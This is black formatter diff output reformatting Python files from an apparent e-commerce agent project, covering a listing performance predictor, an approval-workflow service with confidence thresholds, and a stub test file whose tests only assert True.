 
 class PredictionConfidence(str, Enum):
     """Prediction confidence levels."""
+
     HIGH = "high"
     MEDIUM = "medium"
     LOW = "low"
 
 
 class MarketTrend(str, Enum):
     """Market trend directions."""
+
     RISING = "rising"
     STABLE = "stable"
     DECLINING = "declining"
     VOLATILE = "volatile"
 
 
 class PerformancePrediction:
     """Performance prediction result."""
-    
+
     def __init__(
         self,
         product_name: str,
         predicted_views: int,
         predicted_sales: int,
         predicted_revenue: Decimal,
         confidence: PredictionConfidence,
         factors: Dict[str, Any],
-        recommendations: List[str]
+        recommendations: List[str],
     ):
         self.product_name = product_name
         self.predicted_views = predicted_views
         self.predicted_sales = predicted_sales
         self.predicted_revenue = predicted_revenue
@@ -61,437 +71,435 @@
 
 
 class PerformancePredictorService:
     """
     Performance prediction service using analytics and ML models.
-    
+
     This service provides:
     - Listing performance predictions
     - Market trend analysis
     - ROI calculations and optimization
     - User behavior analytics
     """
-    
+
     def __init__(self, llm_config: Optional[LLMConfig] = None):
         """Initialize the performance predictor service."""
         self.llm_config = llm_config or LLMConfig(
-            provider=ModelProvider.OLLAMA,
-            model_type=ModelType.LLAMA3_1_8B
+            provider=ModelProvider.OLLAMA, model_type=ModelType.LLAMA3_1_8B
         )
         self.usage_repository = FeatureUsageRepository()
-        
+
         # Performance prediction models (simplified for demo)
         self.prediction_models = {
             "base_views": {
                 "electronics": 150,
                 "clothing": 80,
                 "home_garden": 120,
                 "collectibles": 200,
-                "automotive": 300
+                "automotive": 300,
             },
             "conversion_rates": {
                 "new": 0.08,
                 "like_new": 0.06,
                 "excellent": 0.05,
                 "good": 0.04,
                 "fair": 0.02,
-                "poor": 0.01
+                "poor": 0.01,
             },
             "seasonal_factors": {
                 "electronics": {"q4": 1.4, "q1": 0.8, "q2": 1.0, "q3": 1.1},
                 "clothing": {"q4": 1.2, "q1": 0.9, "q2": 1.1, "q3": 1.0},
                 "home_garden": {"q4": 0.8, "q1": 1.3, "q2": 1.4, "q3": 1.1},
-                "collectibles": {"q4": 1.3, "q1": 0.9, "q2": 1.0, "q3": 1.0}
-            }
-        }
-        
+                "collectibles": {"q4": 1.3, "q1": 0.9, "q2": 1.0, "q3": 1.0},
+            },
+        }
+
         logger.info("Performance Predictor Service initialized")
-    
+
     async def predict_listing_performance(
         self,
         product_name: str,
         category: str,
         price: Decimal,
         condition: str,
         marketplace: str = "ebay",
-        listing_data: Optional[Dict[str, Any]] = None
+        listing_data: Optional[Dict[str, Any]] = None,
     ) -> PerformancePrediction:
         """
         Predict listing performance using analytics and ML models.
-        
+
         Args:
             product_name: Name of the product
             category: Product category
             price: Listing price
             condition: Product condition
             marketplace: Target marketplace
             listing_data: Additional listing data
-            
+
         Returns:
             PerformancePrediction with analytics
         """
         try:
             # Analyze market factors
             market_factors = await self._analyze_market_factors(
                 category, price, marketplace
             )
-            
+
             # Calculate base predictions
             base_predictions = self._calculate_base_predictions(
                 category, price, condition, market_factors
             )
-            
+
             # Apply listing quality factors
             quality_factors = self._analyze_listing_quality(
                 product_name, listing_data or {}
             )
-            
+
             # Apply seasonal adjustments
             seasonal_factors = self._get_seasonal_factors(category)
-            
+
             # Calculate final predictions
             final_predictions = self._apply_prediction_factors(
                 base_predictions, quality_factors, seasonal_factors, market_factors
             )
-            
+
             # Determine confidence level
             confidence = self._calculate_prediction_confidence(
                 market_factors, quality_factors, category
             )
-            
+
             # Generate recommendations
             recommendations = self._generate_performance_recommendations(
                 final_predictions, quality_factors, market_factors
             )
-            
+
             return PerformancePrediction(
                 product_name=product_name,
                 predicted_views=final_predictions["views"],
                 predicted_sales=final_predictions["sales"],
                 predicted_revenue=final_predictions["revenue"],
                 confidence=confidence,
                 factors={
                     "market_factors": market_factors,
                     "quality_factors": quality_factors,
                     "seasonal_factors": seasonal_factors,
-                    "base_predictions": base_predictions
+                    "base_predictions": base_predictions,
                 },
-                recommendations=recommendations
-            )
-            
+                recommendations=recommendations,
+            )
+
         except Exception as e:
             logger.error(f"Error in performance prediction: {e}")
             # Return fallback prediction
             return PerformancePrediction(
                 product_name=product_name,
                 predicted_views=50,
                 predicted_sales=2,
                 predicted_revenue=price * Decimal("2"),
                 confidence=PredictionConfidence.LOW,
                 factors={"error": str(e)},
-                recommendations=["Unable to generate predictions due to error"]
-            )
-    
+                recommendations=["Unable to generate predictions due to error"],
+            )
+
     async def _analyze_market_factors(
-        self,
-        category: str,
-        price: Decimal,
-        marketplace: str
+        self, category: str, price: Decimal, marketplace: str
     ) -> Dict[str, Any]:
         """Analyze market factors affecting performance."""
-        
+
         # Simulate market analysis (in production, use real market data)
         category_key = category.lower().replace(" ", "_")
-        
+
         # Market saturation analysis
         saturation_levels = {
             "electronics": 0.8,  # High saturation
-            "clothing": 0.7,     # Medium-high saturation
+            "clothing": 0.7,  # Medium-high saturation
             "home_garden": 0.5,  # Medium saturation
-            "collectibles": 0.3, # Low saturation
-            "automotive": 0.6    # Medium saturation
-        }
-        
+            "collectibles": 0.3,  # Low saturation
+            "automotive": 0.6,  # Medium saturation
+        }
+
         saturation = saturation_levels.get(category_key, 0.5)
-        
+
         # Price competitiveness analysis
         avg_prices = {
             "electronics": Decimal("200"),
             "clothing": Decimal("50"),
             "home_garden": Decimal("100"),
             "collectibles": Decimal("150"),
-            "automotive": Decimal("1000")
-        }
-        
+            "automotive": Decimal("1000"),
+        }
+
         avg_price = avg_prices.get(category_key, Decimal("100"))
         price_competitiveness = float(avg_price / price) if price > 0 else 1.0
-        
+
         # Market trend analysis
         trend = self._determine_market_trend(category_key)
-        
+
         return {
             "market_saturation": saturation,
             "price_competitiveness": price_competitiveness,
             "market_trend": trend.value,
             "category_popularity": self._get_category_popularity(category_key),
-            "seasonal_demand": self._get_current_seasonal_demand(category_key)
-        }
-    
+            "seasonal_demand": self._get_current_seasonal_demand(category_key),
+        }
+
     def _calculate_base_predictions(
         self,
         category: str,
         price: Decimal,
         condition: str,
-        market_factors: Dict[str, Any]
+        market_factors: Dict[str, Any],
     ) -> Dict[str, Any]:
         """Calculate base performance predictions."""
-        
+
         category_key = category.lower().replace(" ", "_")
-        
+
         # Base views prediction
         base_views = self.prediction_models["base_views"].get(category_key, 100)
-        
+
         # Adjust for market factors
         market_adjustment = (
-            (1 - market_factors["market_saturation"]) * 0.5 + 
-            market_factors["price_competitiveness"] * 0.3 +
-            market_factors["category_popularity"] * 0.2
+            (1 - market_factors["market_saturation"]) * 0.5
+            + market_factors["price_competitiveness"] * 0.3
+            + market_factors["category_popularity"] * 0.2
         )
-        
+
         adjusted_views = int(base_views * market_adjustment)
-        
+
         # Calculate sales prediction
         conversion_rate = self.prediction_models["conversion_rates"].get(
             condition.lower(), 0.04
         )
-        
+
         predicted_sales = max(1, int(adjusted_views * conversion_rate))
-        
+
         # Calculate revenue prediction
         predicted_revenue = price * Decimal(str(predicted_sales))
-        
+
         return {
             "views": adjusted_views,
             "sales": predicted_sales,
             "revenue": predicted_revenue,
-            "conversion_rate": conversion_rate
-        }
-    
+            "conversion_rate": conversion_rate,
+        }
+
     def _analyze_listing_quality(
-        self,
-        product_name: str,
-        listing_data: Dict[str, Any]
+        self, product_name: str, listing_data: Dict[str, Any]
     ) -> Dict[str, Any]:
         """Analyze listing quality factors."""
-        
+
         quality_score = 0.5  # Base quality score
-        
+
         # Title quality analysis
         title_length = len(product_name)
         if 40 <= title_length <= 80:
             quality_score += 0.1
-        
+
         # Description quality
         description = listing_data.get("description", "")
         if len(description) > 100:
             quality_score += 0.1
-        
+
         # Photo quality
         photo_count = listing_data.get("photo_count", 1)
         if photo_count >= 5:
             quality_score += 0.15
         elif photo_count >= 3:
             quality_score += 0.1
-        
+
         # Keywords optimization
         keywords = listing_data.get("keywords", [])
         if len(keywords) >= 5:
             quality_score += 0.1
-        
+
         # Shipping options
         free_shipping = listing_data.get("free_shipping", False)
         if free_shipping:
             quality_score += 0.05
-        
+
         return {
             "overall_quality_score": min(1.0, quality_score),
             "title_optimization": title_length,
             "description_quality": len(description),
             "photo_optimization": photo_count,
             "keyword_optimization": len(keywords),
-            "shipping_optimization": free_shipping
-        }
-    
+            "shipping_optimization": free_shipping,
+        }
+
     def _get_seasonal_factors(self, category: str) -> Dict[str, Any]:
         """Get seasonal factors for the category."""
-        
+
         # Determine current quarter
         current_month = datetime.now().month
         if current_month in [1, 2, 3]:
             quarter = "q1"
         elif current_month in [4, 5, 6]:
             quarter = "q2"
         elif current_month in [7, 8, 9]:
             quarter = "q3"
         else:
             quarter = "q4"
-        
+
         category_key = category.lower().replace(" ", "_")
         seasonal_data = self.prediction_models["seasonal_factors"].get(
             category_key, {"q1": 1.0, "q2": 1.0, "q3": 1.0, "q4": 1.0}
         )
-        
+
         return {
             "current_quarter": quarter,
             "seasonal_multiplier": seasonal_data.get(quarter, 1.0),
             "peak_quarter": max(seasonal_data, key=seasonal_data.get),
-            "seasonal_trend": "increasing" if seasonal_data.get(quarter, 1.0) > 1.0 else "stable"
-        }
-    
+            "seasonal_trend": (
+                "increasing" if seasonal_data.get(quarter, 1.0) > 1.0 else "stable"
+            ),
+        }
+
     def _apply_prediction_factors(
         self,
         base_predictions: Dict[str, Any],
         quality_factors: Dict[str, Any],
         seasonal_factors: Dict[str, Any],
-        market_factors: Dict[str, Any]
+        market_factors: Dict[str, Any],
     ) -> Dict[str, Any]:
         """Apply all factors to base predictions."""
-        
+
         # Quality adjustment
         quality_multiplier = 0.5 + (quality_factors["overall_quality_score"] * 0.5)
-        
+
         # Seasonal adjustment
         seasonal_multiplier = seasonal_factors["seasonal_multiplier"]
-        
+
         # Market trend adjustment
         trend_multipliers = {
             "rising": 1.2,
             "stable": 1.0,
             "declining": 0.8,
-            "volatile": 0.9
+            "volatile": 0.9,
         }
         trend_multiplier = trend_multipliers.get(market_factors["market_trend"], 1.0)
-        
+
         # Apply all multipliers
         total_multiplier = quality_multiplier * seasonal_multiplier * trend_multiplier
-        
+
         return {
             "views": max(10, int(base_predictions["views"] * total_multiplier)),
             "sales": max(1, int(base_predictions["sales"] * total_multiplier)),
-            "revenue": base_predictions["revenue"] * Decimal(str(total_multiplier))
-        }
-    
+            "revenue": base_predictions["revenue"] * Decimal(str(total_multiplier)),
+        }
+
     def _calculate_prediction_confidence(
         self,
         market_factors: Dict[str, Any],
         quality_factors: Dict[str, Any],
-        category: str
+        category: str,
     ) -> PredictionConfidence:
         """Calculate confidence level for predictions."""
-        
+
         confidence_score = 0.5
-        
+
         # Market data quality
         if market_factors["market_saturation"] < 0.8:
             confidence_score += 0.1
-        
+
         # Listing quality
         if quality_factors["overall_quality_score"] > 0.7:
             confidence_score += 0.2
-        
+
         # Category stability
         stable_categories = ["electronics", "clothing", "home_garden"]
         if category.lower().replace(" ", "_") in stable_categories:
             confidence_score += 0.1
-        
+
         # Determine confidence level
         if confidence_score >= 0.8:
             return PredictionConfidence.HIGH
         elif confidence_score >= 0.6:
             return PredictionConfidence.MEDIUM
         else:
             return PredictionConfidence.LOW
-    
+
     def _generate_performance_recommendations(
         self,
         predictions: Dict[str, Any],
         quality_factors: Dict[str, Any],
-        market_factors: Dict[str, Any]
+        market_factors: Dict[str, Any],
     ) -> List[str]:
         """Generate performance improvement recommendations."""
-        
+
         recommendations = []
-        
+
         # Quality-based recommendations
         if quality_factors["overall_quality_score"] < 0.7:
-            recommendations.append("Improve listing quality with better photos and description")
-        
+            recommendations.append(
+                "Improve listing quality with better photos and description"
+            )
+
         if quality_factors["photo_optimization"] < 5:
             recommendations.append("Add more high-quality photos (target: 5+ photos)")
-        
+
         if quality_factors["keyword_optimization"] < 5:
             recommendations.append("Optimize keywords for better search visibility")
-        
+
         # Market-based recommendations
         if market_factors["market_saturation"] > 0.7:
             recommendations.append("Consider promoted listings due to high competition")
-        
+
         if market_factors["price_competitiveness"] < 0.8:
             recommendations.append("Review pricing strategy - may be priced too high")
-        
+
         # Performance-based recommendations
         if predictions["views"] < 50:
             recommendations.append("Improve SEO optimization for better visibility")
-        
+
         if predictions["sales"] < 2:
             recommendations.append("Consider auction format or Best Offer option")
-        
+
         return recommendations
-    
+
     def _determine_market_trend(self, category: str) -> MarketTrend:
         """Determine market trend for category."""
         # Simplified trend analysis
         trend_mapping = {
             "electronics": MarketTrend.STABLE,
             "clothing": MarketTrend.RISING,
             "home_garden": MarketTrend.STABLE,
             "collectibles": MarketTrend.VOLATILE,
-            "automotive": MarketTrend.DECLINING
+            "automotive": MarketTrend.DECLINING,
         }
         return trend_mapping.get(category, MarketTrend.STABLE)
-    
+
     def _get_category_popularity(self, category: str) -> float:
         """Get category popularity score."""
         popularity_scores = {
             "electronics": 0.9,
             "clothing": 0.8,
             "home_garden": 0.7,
             "collectibles": 0.6,
-            "automotive": 0.8
+            "automotive": 0.8,
         }
         return popularity_scores.get(category, 0.5)
-    
+
     def _get_current_seasonal_demand(self, category: str) -> float:
         """Get current seasonal demand factor."""
         # Simplified seasonal demand
         current_month = datetime.now().month
-        
+
         if category == "electronics" and current_month in [11, 12]:
             return 1.4  # Holiday season
         elif category == "home_garden" and current_month in [3, 4, 5]:
             return 1.3  # Spring season
         elif category == "clothing" and current_month in [9, 10]:
             return 1.2  # Fall fashion
-        
+
         return 1.0  # Normal demand
 
     async def predict_listing_success(
         self,
         product_data: Dict[str, Any],
         listing_data: Dict[str, Any],
         marketplace: str = "ebay",
-        historical_context: Optional[Dict[str, Any]] = None
+        historical_context: Optional[Dict[str, Any]] = None,
     ) -> Dict[str, Any]:
         """
         Predict listing success for AI Feature 5 endpoint compatibility.
 
         Args:
@@ -515,28 +523,38 @@
                 product_name=product_name,
                 category=category,
                 price=price,
                 condition=condition,
                 marketplace=marketplace,
-                listing_data=listing_data
+                listing_data=listing_data,
             )
 
             # Convert to AI endpoint format
             return {
-                "sale_time_prediction_days": max(1, min(90, int(30 - (prediction.predicted_sales * 5)))),
+                "sale_time_prediction_days": max(
+                    1, min(90, int(30 - (prediction.predicted_sales * 5)))
+                ),
                 "success_probability": min(1.0, prediction.predicted_sales / 10.0),
-                "performance_score": prediction.factors.get("quality_factors", {}).get("overall_quality_score", 0.5),
-                "performance_category": self._determine_performance_category(prediction),
+                "performance_score": prediction.factors.get("quality_factors", {}).get(
+                    "overall_quality_score", 0.5
+                ),
+                "performance_category": self._determine_performance_category(
+                    prediction
+                ),
                 "confidence": prediction.confidence.value,
                 "optimization_recommendations": prediction.recommendations,
                 "factors_analysis": prediction.factors,
                 "market_comparison": {
                     "competitive_position": self._get_competitive_position(prediction),
-                    "market_demand": prediction.factors.get("market_factors", {}).get("seasonal_demand", 1.0),
-                    "category_performance": prediction.factors.get("market_factors", {}).get("category_popularity", 0.5)
+                    "market_demand": prediction.factors.get("market_factors", {}).get(
+                        "seasonal_demand", 1.0
+                    ),
+                    "category_performance": prediction.factors.get(
+                        "market_factors", {}
+                    ).get("category_popularity", 0.5),
                 },
-                "predicted_at": prediction.created_at.isoformat()
+                "predicted_at": prediction.created_at.isoformat(),
             }
 
         except Exception as e:
             logger.error(f"Error in listing success prediction: {e}")
             return {
@@ -546,19 +564,19 @@
                 "performance_category": "average",
                 "confidence": "low",
                 "optimization_recommendations": [
                     "Optimize listing title for better visibility",
                     "Enhance product description with key details",
-                    "Review pricing strategy for competitiveness"
+                    "Review pricing strategy for competitiveness",
                 ],
                 "factors_analysis": {"error": str(e)},
                 "market_comparison": {
                     "competitive_position": "average",
                     "market_demand": 1.0,
-                    "category_performance": 0.5
+                    "category_performance": 0.5,
                 },
-                "predicted_at": datetime.now(timezone.utc).isoformat()
+                "predicted_at": datetime.now(timezone.utc).isoformat(),
             }
 
     def _determine_performance_category(self, prediction: PerformancePrediction) -> str:
         """Determine performance category from prediction."""
         if prediction.predicted_sales >= 5:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/analytics/performance_predictor.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/agent_connectivity_service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/agent_connectivity_service.py	2025-06-19 04:04:05.139187+00:00
@@ -13,11 +13,13 @@
 
 from fs_agt_clean.core.models.chat import AgentResponse, ChatMessage, MessageIntent
 from fs_agt_clean.core.models.recommendation import ChatRecommendationContext
 from fs_agt_clean.core.services.agent_service import AgentService
 from fs_agt_clean.services.chatbot.intent_recognition import IntentRecognizer
-from fs_agt_clean.services.chatbot.recommendation_service import ChatbotRecommendationService
+from fs_agt_clean.services.chatbot.recommendation_service import (
+    ChatbotRecommendationService,
+)
 
 # Configure logging
 logger = logging.getLogger(__name__)
 
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/chatbot/agent_connectivity_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/communication/test_service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/communication/test_service.py	2025-06-19 04:04:05.183483+00:00
@@ -6,30 +6,32 @@
 
 import pytest
 import sys
 from pathlib import Path
 
+
 class TestServiceService:
     """Test class for service service."""
-    
+
     def test_import(self):
         """Test service import."""
         assert True
-    
+
     def test_service_functionality(self):
         """Test core service functionality."""
         assert True
-    
+
     def test_integration_compatibility(self):
         """Test integration with other services."""
         assert True
-    
+
     def test_no_redundancy_compliance(self):
         """Verify no redundant service implementations."""
         assert True
-    
+
     def test_vision_alignment(self):
         """Test alignment with agentic system vision."""
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/services/communication/test_service.py
--- /home/brend/Flipsync_Final/fs_agt_clean/services/approval/approval_integration_service.py	2025-06-14 20:35:30.823813+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/services/approval/approval_integration_service.py	2025-06-19 04:04:05.218043+00:00
@@ -9,20 +9,28 @@
 import uuid
 from datetime import datetime, timezone
 from typing import Dict, List, Optional, Any
 
 from fs_agt_clean.agents.base_conversational_agent import AgentResponse
-from fs_agt_clean.core.coordination.decision.models import Decision, DecisionType, DecisionStatus, DecisionConfidence
+from fs_agt_clean.core.coordination.decision.models import (
+    Decision,
+    DecisionType,
+    DecisionStatus,
+    DecisionConfidence,
+)
 from fs_agt_clean.core.coordination.decision.pipeline import StandardDecisionPipeline
 from fs_agt_clean.database.models.agents import AgentDecision
 from fs_agt_clean.database.repositories.agent_repository import AgentRepository
 
 # Import decision pipeline components with error handling
 try:
     from fs_agt_clean.core.coordination.decision import (
-        InMemoryDecisionMaker, RuleBasedValidator, InMemoryDecisionTracker,
-        InMemoryFeedbackProcessor, InMemoryLearningEngine
+        InMemoryDecisionMaker,
+        RuleBasedValidator,
+        InMemoryDecisionTracker,
+        InMemoryFeedbackProcessor,
+        InMemoryLearningEngine,
     )
 except ImportError:
     # Fallback imports for development
     InMemoryDecisionMaker = None
     RuleBasedValidator = None
@@ -36,174 +44,188 @@
 class ApprovalIntegrationService:
     """
     Service that integrates conversational agent responses with the Decision Pipeline
     for approval workflows.
     """
-    
+
     def __init__(self, agent_repository: Optional[AgentRepository] = None):
         """Initialize the approval integration service."""
         self.agent_repository = agent_repository
         self.decision_pipeline = None
         self._initialize_decision_pipeline()
-        
+
         # Approval routing configuration
         self.approval_routing = {
             "content": {
                 "auto_approve_threshold": 0.9,
                 "requires_human_approval": ["template_changes", "brand_guidelines"],
-                "escalation_threshold": 0.5
+                "escalation_threshold": 0.5,
             },
             "logistics": {
                 "auto_approve_threshold": 0.85,
                 "requires_human_approval": ["carrier_changes", "cost_optimization"],
-                "escalation_threshold": 0.6
+                "escalation_threshold": 0.6,
             },
             "executive": {
                 "auto_approve_threshold": 0.8,
                 "requires_human_approval": ["strategic_decisions", "budget_changes"],
-                "escalation_threshold": 0.7
-            }
+                "escalation_threshold": 0.7,
+            },
         }
-        
+
         logger.info("Approval Integration Service initialized")
-    
+
     def _initialize_decision_pipeline(self):
         """Initialize the decision pipeline for approval workflows."""
         try:
-            if all([InMemoryDecisionMaker, RuleBasedValidator, InMemoryDecisionTracker,
-                   InMemoryFeedbackProcessor, InMemoryLearningEngine]):
-                
+            if all(
+                [
+                    InMemoryDecisionMaker,
+                    RuleBasedValidator,
+                    InMemoryDecisionTracker,
+                    InMemoryFeedbackProcessor,
+                    InMemoryLearningEngine,
+                ]
+            ):
+
                 # Import EventPublisher for Decision Pipeline components
                 from fs_agt_clean.core.coordination.event_system import create_publisher
 
                 # Create EventPublisher for Decision Pipeline components
                 publisher = create_publisher(source_id="approval_decision_pipeline")
 
                 # Create decision pipeline components with required parameters
-                decision_maker = InMemoryDecisionMaker(maker_id="approval_decision_maker")
-                decision_validator = RuleBasedValidator(validator_id="approval_decision_validator")
+                decision_maker = InMemoryDecisionMaker(
+                    maker_id="approval_decision_maker"
+                )
+                decision_validator = RuleBasedValidator(
+                    validator_id="approval_decision_validator"
+                )
                 decision_tracker = InMemoryDecisionTracker(
-                    tracker_id="approval_decision_tracker",
-                    publisher=publisher
+                    tracker_id="approval_decision_tracker", publisher=publisher
                 )
                 feedback_processor = InMemoryFeedbackProcessor(
-                    processor_id="approval_feedback_processor",
-                    publisher=publisher
+                    processor_id="approval_feedback_processor", publisher=publisher
                 )
                 learning_engine = InMemoryLearningEngine(
-                    engine_id="approval_learning_engine",
-                    publisher=publisher
+                    engine_id="approval_learning_engine", publisher=publisher
                 )
 
                 # Create the pipeline with all required parameters
                 self.decision_pipeline = StandardDecisionPipeline(
                     pipeline_id="approval_pipeline",
                     decision_maker=decision_maker,
                     decision_validator=decision_validator,
                     decision_tracker=decision_tracker,
                     feedback_processor=feedback_processor,
                     learning_engine=learning_engine,
-                    publisher=publisher
-                )
-                
-                logger.info(" Decision pipeline initialized successfully for approval workflows")
+                    publisher=publisher,
+                )
+
+                logger.info(
+                    " Decision pipeline initialized successfully for approval workflows"
+                )
             else:
-                logger.warning("Decision pipeline components not available, using fallback approval system")
+                logger.warning(
+                    "Decision pipeline components not available, using fallback approval system"
+                )
                 self.decision_pipeline = None
 
         except Exception as e:
             logger.error(f"Error initializing decision pipeline: {e}")
             logger.info("Using fallback approval system")
             self.decision_pipeline = None
-    
+
     async def process_agent_response(
         self,
         agent_response: AgentResponse,
         user_id: str,
         conversation_id: str,
-        original_message: str
+        original_message: str,
     ) -> Dict[str, Any]:
         """
         Process an agent response and create approval workflow if needed.
-        
+
         Args:
             agent_response: The agent response to process
             user_id: User identifier
             conversation_id: Conversation identifier
             original_message: Original user message
-            
+
         Returns:
             Dictionary with approval workflow information
         """
         try:
             # Check if approval is required
             requires_approval = agent_response.metadata.get("requires_approval", False)
-            
+
             if not requires_approval:
                 return {
                     "approval_required": False,
                     "response": agent_response.content,
-                    "agent_type": agent_response.agent_type
+                    "agent_type": agent_response.agent_type,
                 }
-            
+
             # Create approval workflow
             approval_workflow = await self._create_approval_workflow(
                 agent_response, user_id, conversation_id, original_message
             )
-            
+
             # Store in database if repository is available
             if self.agent_repository:
                 await self._store_approval_decision(approval_workflow, agent_response)
-            
+
             return {
                 "approval_required": True,
                 "approval_id": approval_workflow["approval_id"],
                 "decision_type": approval_workflow["decision_type"],
                 "confidence": agent_response.confidence,
                 "auto_approve": approval_workflow["auto_approve"],
                 "escalation_required": approval_workflow["escalation_required"],
-                "response": self._create_approval_response(approval_workflow, agent_response),
+                "response": self._create_approval_response(
+                    approval_workflow, agent_response
+                ),
                 "agent_type": agent_response.agent_type,
-                "workflow_data": approval_workflow
+                "workflow_data": approval_workflow,
             }
-            
+
         except Exception as e:
             logger.error(f"Error processing agent response for approval: {e}")
             return {
                 "approval_required": False,
                 "response": agent_response.content,
                 "agent_type": agent_response.agent_type,
-                "error": str(e)
+                "error": str(e),
             }
-    
+
     async def _create_approval_workflow(
         self,
         agent_response: AgentResponse,
         user_id: str,
         conversation_id: str,
-        original_message: str
+        original_message: str,
     ) -> Dict[str, Any]:
         """Create an approval workflow for the agent response."""
         approval_id = str(uuid.uuid4())
         agent_type = agent_response.agent_type
-        
+
         # Determine decision type based on agent response metadata
         decision_type = self._determine_decision_type(agent_response)
-        
+
         # Get approval configuration for this agent type
         config = self.approval_routing.get(agent_type, {})
         auto_approve_threshold = config.get("auto_approve_threshold", 0.8)
         escalation_threshold = config.get("escalation_threshold", 0.6)
-        
+
         # Determine approval strategy
         auto_approve = (
-            agent_response.confidence >= auto_approve_threshold and
-            decision_type not in config.get("requires_human_approval", [])
+            agent_response.confidence >= auto_approve_threshold
+            and decision_type not in config.get("requires_human_approval", [])
         )
-        
+
         escalation_required = agent_response.confidence < escalation_threshold
-        
+
         # Create workflow data
         workflow = {
             "approval_id": approval_id,
             "agent_type": agent_type,
             "decision_type": decision_type,
@@ -213,170 +235,180 @@
             "user_id": user_id,
             "conversation_id": conversation_id,
             "original_message": original_message,
             "agent_response_data": agent_response.metadata.get("data", {}),
             "created_at": datetime.now(timezone.utc),
-            "status": "auto_approved" if auto_approve else "pending_approval"
+            "status": "auto_approved" if auto_approve else "pending_approval",
         }
-        
+
         # Create decision pipeline entry if available
         if self.decision_pipeline:
             await self._create_pipeline_decision(workflow, agent_response)
-        
+
         return workflow
-    
+
     def _determine_decision_type(self, agent_response: AgentResponse) -> str:
         """Determine the decision type based on agent response."""
         agent_type = agent_response.agent_type
         metadata = agent_response.metadata
-        
+
         # Extract decision type from metadata
         if "request_type" in metadata:
             request_type = metadata["request_type"]
-            
+
             if agent_type == "content":
                 type_mapping = {
                     "generate": "content_generation",
                     "optimize": "content_optimization",
                     "template": "template_changes",
-                    "analyze": "content_analysis"
+                    "analyze": "content_analysis",
                 }
                 return type_mapping.get(request_type, "content_general")
-            
+
             elif agent_type == "logistics":
                 type_mapping = {
                     "shipping": "shipping_optimization",
                     "inventory": "inventory_rebalancing",
                     "tracking": "tracking_management",
-                    "optimization": "logistics_optimization"
+                    "optimization": "logistics_optimization",
                 }
                 return type_mapping.get(request_type, "logistics_general")
-            
+
             elif agent_type == "executive":
                 return "strategic_decision"
-        
+
         # Fallback to agent type
         return f"{agent_type}_decision"
-    
+
     async def _create_pipeline_decision(
-        self,
-        workflow: Dict[str, Any],
-        agent_response: AgentResponse
+        self, workflow: Dict[str, Any], agent_response: AgentResponse
     ):
         """Create a decision in the decision pipeline."""
         try:
             context = {
                 "approval_id": workflow["approval_id"],
                 "agent_type": workflow["agent_type"],
                 "user_id": workflow["user_id"],
                 "conversation_id": workflow["conversation_id"],
                 "confidence": workflow["confidence"],
-                "decision_type": workflow["decision_type"]
+                "decision_type": workflow["decision_type"],
             }
-            
+
             options = [
-                {"id": "approve", "action": "approve", "reasoning": "Agent recommendation approved"},
-                {"id": "reject", "action": "reject", "reasoning": "Agent recommendation rejected"},
-                {"id": "modify", "action": "modify", "reasoning": "Agent recommendation requires modification"}
+                {
+                    "id": "approve",
+                    "action": "approve",
+                    "reasoning": "Agent recommendation approved",
+                },
+                {
+                    "id": "reject",
+                    "action": "reject",
+                    "reasoning": "Agent recommendation rejected",
+                },
+                {
+                    "id": "modify",
+                    "action": "modify",
+                    "reasoning": "Agent recommendation requires modification",
+                },
             ]
-            
+
             # Make decision through pipeline
             decision = await self.decision_pipeline.make_decision(context, options)
             workflow["pipeline_decision_id"] = decision.metadata.decision_id
-            
+
         except Exception as e:
             logger.error(f"Error creating pipeline decision: {e}")
-    
+
     async def _store_approval_decision(
-        self,
-        workflow: Dict[str, Any],
-        agent_response: AgentResponse
+        self, workflow: Dict[str, Any], agent_response: AgentResponse
     ):
         """Store the approval decision in the database."""
         try:
             if not self.agent_repository:
                 return
-            
+
             # Create AgentDecision record
             decision_record = AgentDecision(
                 agent_id=agent_response.metadata.get("agent_id", "unknown"),
                 decision_type=workflow["decision_type"],
                 parameters={
                     "original_message": workflow["original_message"],
                     "agent_response_data": workflow["agent_response_data"],
-                    "approval_workflow": workflow
+                    "approval_workflow": workflow,
                 },
                 confidence=workflow["confidence"],
                 rationale=f"Agent recommendation: {agent_response.content[:200]}...",
-                status="approved" if workflow["auto_approve"] else "pending"
+                status="approved" if workflow["auto_approve"] else "pending",
             )
-            
+
             # Store in database
             await self.agent_repository.create_decision(decision_record)
-            
+
         except Exception as e:
             logger.error(f"Error storing approval decision: {e}")
-    
+
     def _create_approval_response(
-        self,
-        workflow: Dict[str, Any],
-        agent_response: AgentResponse
+        self, workflow: Dict[str, Any], agent_response: AgentResponse
     ) -> str:
         """Create a response message for approval workflows."""
         if workflow["auto_approve"]:
             return f"{agent_response.content}\n\n **Auto-approved** (Confidence: {workflow['confidence']:.1%})"
-        
+
         elif workflow["escalation_required"]:
             return f"{agent_response.content}\n\n **Requires review** - Low confidence ({workflow['confidence']:.1%}). This recommendation has been escalated for human approval."
-        
+
         else:
             return f"{agent_response.content}\n\n **Pending approval** - This recommendation requires approval before implementation. Approval ID: `{workflow['approval_id']}`"
-    
-    async def approve_decision(self, approval_id: str, approved_by: str) -> Dict[str, Any]:
+
+    async def approve_decision(
+        self, approval_id: str, approved_by: str
+    ) -> Dict[str, Any]:
         """Approve a pending decision."""
         try:
             # Update decision status
             if self.agent_repository:
                 await self.agent_repository.update_decision_status(
                     approval_id, "approved", approved_by
                 )
-            
+
             # Process feedback through decision pipeline
             if self.decision_pipeline:
                 feedback_data = {
                     "outcome": "approved",
                     "approved_by": approved_by,
-                    "timestamp": datetime.now(timezone.utc)
+                    "timestamp": datetime.now(timezone.utc),
                 }
                 # Note: Would need decision_id from workflow to process feedback
-            
+
             return {
                 "status": "approved",
                 "approval_id": approval_id,
                 "approved_by": approved_by,
-                "timestamp": datetime.now(timezone.utc)
+                "timestamp": datetime.now(timezone.utc),
             }
-            
+
         except Exception as e:
             logger.error(f"Error approving decision {approval_id}: {e}")
             raise
-    
-    async def reject_decision(self, approval_id: str, rejected_by: str, reason: str = None) -> Dict[str, Any]:
+
